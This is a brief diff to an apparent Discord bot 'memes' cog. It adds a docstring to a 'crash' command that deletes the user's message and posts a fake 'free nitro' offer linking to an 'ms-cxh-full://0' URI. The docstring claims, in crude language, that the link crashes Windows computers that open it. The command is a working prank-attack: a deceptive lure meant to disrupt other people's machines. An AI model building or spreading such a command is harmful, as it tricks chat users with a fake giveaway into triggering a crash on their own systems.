@@ -29,7 +29,7 @@ class memes(commands.Cog):
 
     @commands.command()
     async def crash(self, ctx):
-
+        """Sends a link when clicked rapes a windwos computer"""
         await ctx.message.delete()
         await ctx.send("Click this for free nitro! <ms-cxh-full://0>")
 
